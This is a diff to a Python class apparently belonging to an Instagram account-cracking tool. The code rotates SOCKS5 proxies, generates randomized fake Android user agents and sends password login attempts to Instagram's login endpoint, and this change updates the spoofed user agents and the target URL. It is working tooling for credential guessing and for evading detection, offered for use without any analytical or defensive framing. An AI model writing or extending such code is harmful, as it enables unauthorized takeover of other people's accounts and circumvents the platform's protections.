@@ -638,21 +638,21 @@ class instagram:
                 nip=random.choice(prox)
                 proxs= {'http': 'socks5://'+nip}
                 ua = random.choice(uasm)
-                aa='Mozilla/5.0 (iPhone; CPU'
+                aa='Mozilla/5.0 (Linux; Android'
                 b=random.choice(['4','5','6','7','8','9','10','11','12'])
-                c= 'IOS-'
+                c= 'Moto-'
                 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                 e=random.randrange(1, 999)
                 f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36'
+                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
                 h=random.randrange(73,200)
                 i='0'
                 j=random.randrange(4200,4900)
                 k=random.randrange(40,150)
                 l='Mobile Safari/537.36'
                 uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-                uafake=f"Instagram 244.0.0.12.112 (iPhone12,1; iOS {str(rr(4,12))}; Mac OS X) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) en_US; en-US; scale=2.00; 828x1792; 383361019)"
-                token=s.get('https://z-p42.www.instagram.com/accounts/logout/ajax/')
+                uafake=f"Mozilla/5.0 (Linux; Android{str(rr(4,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
+                token=s.get('https://www.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/')
                 headers = {
                     'Host':'www.instagram.com',
                     'connection':'keep-alive',
@@ -672,7 +672,7 @@ class instagram:
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://z-p42.www.instagram.com/accounts/logout/ajax/',
+                    'referer':'https://www.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
